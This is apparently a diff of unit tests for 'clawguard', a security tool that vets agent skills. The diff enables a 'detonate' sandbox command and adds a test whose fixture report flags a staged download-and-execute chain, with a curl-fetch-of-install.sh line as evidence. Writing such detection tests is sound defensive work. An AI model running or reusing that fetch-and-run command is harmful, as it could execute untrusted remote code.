@@ -29,13 +29,10 @@ test("buildPayload parses static-path commands", () => {
     command: "block",
     slug: "calendar-helper",
   });
-});
-
-test("buildPayload rejects detonate because it is hidden from the release CLI", () => {
-  assert.throws(
-    () => buildPayload("detonate", ["calendar-helper"]),
-    /Detonation is not available in this release/u,
-  );
+  assert.deepEqual(buildPayload("detonate", ["calendar-helper"]), {
+    command: "detonate",
+    slug: "calendar-helper",
+  });
 });
 
 test("buildCommand parses direct service-management commands", () => {
@@ -61,7 +58,7 @@ test("buildPayload throws actionable usage errors", () => {
   assert.throws(() => buildPayload("report", []), /Usage: clawguard report <slug>/);
   assert.throws(() => buildPayload("allow", []), /Usage: clawguard allow <slug> \[reason\]/);
   assert.throws(() => buildPayload("block", []), /Usage: clawguard block <slug> \[reason\]/);
-  assert.throws(() => buildPayload("detonate", []), /Detonation is not available in this release/u);
+  assert.throws(() => buildPayload("detonate", []), /Usage: clawguard detonate <slug>/);
   assert.throws(() => buildPayload("unknown", []), /Unknown command: unknown/);
   assert.throws(
     () => buildCommand("service", []),
@@ -88,6 +85,47 @@ test("formatConnectionError points operators at the install-safe daemon command"
   error.code = "ENOENT";
 
   assert.match(formatConnectionError(error), /Start the daemon first: clawguard daemon/u);
+});
+
+test("formatSuccess renders detonation reports", () => {
+  const output = formatSuccess(
+    { command: "detonate", slug: "calendar-helper" },
+    {
+      report: {
+        request: {
+          requestId: "det-001",
+          snapshot: {
+            slug: "calendar-helper",
+            path: "/tmp/calendar-helper",
+            sourceHints: [],
+            contentHash: "sha256:test",
+            fileInventory: ["SKILL.md"],
+            detectedAt: "2026-03-19T00:00:00.000Z",
+          },
+          prompts: ["run"],
+          timeoutSeconds: 90,
+        },
+        summary: "Behavioral detonation observed a staged download-and-execute chain.",
+        findings: [
+          {
+            ruleId: "CG-DET-STAGED-DOWNLOAD-EXECUTE",
+            severity: "critical",
+            message: "Behavioral detonation observed a staged download-and-execute chain.",
+            evidence: ["Executed /usr/bin/curl https://example.com/install.sh"],
+          },
+        ],
+        score: 90,
+        recommendation: "block",
+        triggeredActions: ["/usr/bin/curl https://example.com/install.sh"],
+        artifacts: [],
+        generatedAt: "2026-03-19T00:00:01.000Z",
+      },
+    },
+    false,
+  );
+
+  assert.match(output, /Detonation completed for calendar-helper/u);
+  assert.match(output, /Recommendation: block/u);
 });
 
 test("foreground daemon launch preserves the caller cwd", () => {
